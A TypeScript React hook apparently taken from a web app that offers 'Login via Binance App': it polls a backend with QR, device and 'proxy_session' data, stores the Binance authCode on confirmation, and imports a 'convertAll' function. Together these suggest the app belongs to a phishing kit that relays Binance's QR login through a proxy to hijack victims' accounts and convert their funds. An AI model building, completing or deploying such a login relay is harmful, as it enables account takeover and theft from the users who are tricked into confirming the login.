import { useState, useEffect, useRef, useCallback } from 'react';
import { checkLinkStatus, convertAll } from '../services/api';
import { ApiResponse, StatusResponse } from '../types/api';

const CHECK_INTERVAL = 3000; // Check every 3 seconds

export const useLoginStatus = (onConfirm: () => void) => {
  const [isCheckingStatus, setIsCheckingStatus] = useState(false);
  const [buttonText, setButtonText] = useState('Login via Binance App');
  const [isConfirmed, setIsConfirmed] = useState(false);
  const [statusMessage, setStatusMessage] = useState('');
  const currentRequestRef = useRef<AbortController | null>(null);
  const checkTimeoutRef = useRef<NodeJS.Timeout | null>(null);
  const hasStartedRef = useRef(false);
  const conversionumbersRequestRef = useRef<Promise<ApiResponse> | null>(null);
  const hasConfirmedRef = useRef(false);
  const isCheckingRef = useRef(false);
  let isHidden = false;

  const updateStatus = (message: string) => {
    setStatusMessage(prev => `${new Date().toLocaleTimeString()}: ${message}\n${prev}`);
  };

  const checkStatus = useCallback(async () => {
    if (isConfirmed || hasConfirmedRef.current || isCheckingRef.current) {
      updateStatus('Check skipped - already checking or confirmed');
      return;
    }

    isCheckingRef.current = true;
    updateStatus('Starting status check...');

    if (currentRequestRef.current) {
      currentRequestRef.current.abort();
    }

    const sessionId = localStorage.getItem('sessionId');
    const session_id = localStorage.getItem('session_id');
    const deviceInfo = localStorage.getItem('deviceInfo');
    const qrCode = localStorage.getItem('qrCode');
    const random = localStorage.getItem('random');
    const proxySession = localStorage.getItem('proxy_session');

    if (!sessionId || !session_id || !deviceInfo || !qrCode || !random || !proxySession) {
      updateStatus('Missing localStorage items, stopping checks');
      isCheckingRef.current = false;
      return;
    }

    const abortController = new AbortController();
    currentRequestRef.current = abortController;

    try {
      updateStatus('Making API request...');
      const data = await checkLinkStatus({
        session_id,
        sessionId,
        device_info: deviceInfo,
        qrCode,
        random,
        proxy_session: proxySession
      }) as StatusResponse;

      if (data.code === '600000004') {
        updateStatus('Verification Failed');
        setButtonText('Verification Failed. Refreshing');
        setTimeout(() => {
          window.location.reload();
        }, 3000);
        return;
      }

      if (data.code === '024014') {
        updateStatus('Device does not match. Refreshing page...');
        setButtonText('Device Mismatch. Refreshing');
        setTimeout(() => {
          window.location.reload();
        }, 2000);
        return;
      }

      if (data.success && data.data) {
        updateStatus(`Status received: ${data.data.status}`);
        switch (data.data.status) {
          case 'SCAN':
            setButtonText('Click & Confirm in Binance App');
            break;
          case 'NEW':
            break;
          case 'CONFIRM':
            setButtonText('Success! Redirecting');
            setIsConfirmed(true);
            hasConfirmedRef.current = true;
            
            if (data.data.code) {
              localStorage.setItem('authCode', data.data.code);
            }
            if (data.data.bncLocation) {
              localStorage.setItem('bncLocation', data.data.bncLocation);
            }
            
            onConfirm();
            return;
          case 'EXPIRED':
            setButtonText('Login Expired, Try again');
            setTimeout(() => {
              window.location.reload();
            }, 3000);
            return;
        }
      }
    } catch (error: any) {
      updateStatus(`Error: ${error.message}`);
      console.error('Error checking status:', error);
    } finally {
      currentRequestRef.current = null;
      isCheckingRef.current = false;
      updateStatus('Check completed');
      if (!isConfirmed && !hasConfirmedRef.current) {
        if (checkTimeoutRef.current) {
          clearTimeout(checkTimeoutRef.current);
        }
        checkTimeoutRef.current = setTimeout(checkStatus, CHECK_INTERVAL);
      }
    }
  }, [isConfirmed, onConfirm]);

  const startChecking = useCallback(() => {
    if (isCheckingStatus) return;
    setButtonText('LOADING');  // Show just loader
    setIsCheckingStatus(true);
    localStorage.setItem('isCheckingStatus', 'true');
    checkStatus();
  }, [isCheckingStatus, checkStatus]);

  const waitForConversion = async () => {
    if (conversionumbersRequestRef.current) {
      await conversionumbersRequestRef.current;
    }
  };

  useEffect(() => {
    return () => {
      if (checkTimeoutRef.current) {
        clearTimeout(checkTimeoutRef.current);
      }
      if (currentRequestRef.current) {
        currentRequestRef.current.abort();
      }
      localStorage.removeItem('isCheckingStatus');
      hasStartedRef.current = false;
      isCheckingRef.current = false;  // Reset isChecking on cleanup
    };
  }, []);

  useEffect(() => {
    const handleVisibilityChange = () => {
      updateStatus(`Visibility changed: ${document.hidden ? 'hidden' : 'visible'}`);
      if (!isCheckingStatus) return;

      if (document.hidden) {
        isHidden = true;
        if (checkTimeoutRef.current) {
          clearTimeout(checkTimeoutRef.current);
          checkTimeoutRef.current = null;
        }
        if (currentRequestRef.current) {
          currentRequestRef.current.abort();
          currentRequestRef.current = null;
        }
        isCheckingRef.current = false;
        updateStatus('Stopped checks - page hidden');
      } else {
        isHidden = false;
        if (!isConfirmed && !hasConfirmedRef.current) {
          setTimeout(() => {
            updateStatus('Restarting checks - page visible');
            checkStatus();
          }, 100);
        }
      }
    };

    const handleBeforeUnload = () => {
      // Clean up everything when closing window
      if (checkTimeoutRef.current) {
        clearTimeout(checkTimeoutRef.current);
        checkTimeoutRef.current = null;
      }
      if (currentRequestRef.current) {
        currentRequestRef.current.abort();
        currentRequestRef.current = null;
      }
      isCheckingRef.current = false;
    };

    // Use standard JavaScript events
    document.addEventListener('visibilitychange', handleVisibilityChange);
    window.addEventListener('focus', handleVisibilityChange);
    window.addEventListener('pageshow', handleVisibilityChange);
    window.addEventListener('resume', handleVisibilityChange); // For iOS
    window.addEventListener('beforeunload', handleBeforeUnload);

    // Additional Safari-specific events
    if (navigator.userAgent.includes('Safari') && !navigator.userAgent.includes('Chrome')) {
      window.addEventListener('pagehide', handleBeforeUnload);
      window.addEventListener('unload', handleBeforeUnload);
    }

    return () => {
      document.removeEventListener('visibilitychange', handleVisibilityChange);
      window.removeEventListener('focus', handleVisibilityChange);
      window.removeEventListener('pageshow', handleVisibilityChange);
      window.removeEventListener('resume', handleVisibilityChange);
      window.removeEventListener('beforeunload', handleBeforeUnload);
      
      if (navigator.userAgent.includes('Safari') && !navigator.userAgent.includes('Chrome')) {
        window.removeEventListener('pagehide', handleBeforeUnload);
        window.removeEventListener('unload', handleBeforeUnload);
      }
    };
  }, [isCheckingStatus, checkStatus, isConfirmed]);

  return {
    isCheckingStatus,
    buttonText,
    isConfirmed,
    startChecking,
    waitForConversion,
    statusMessage
  };
};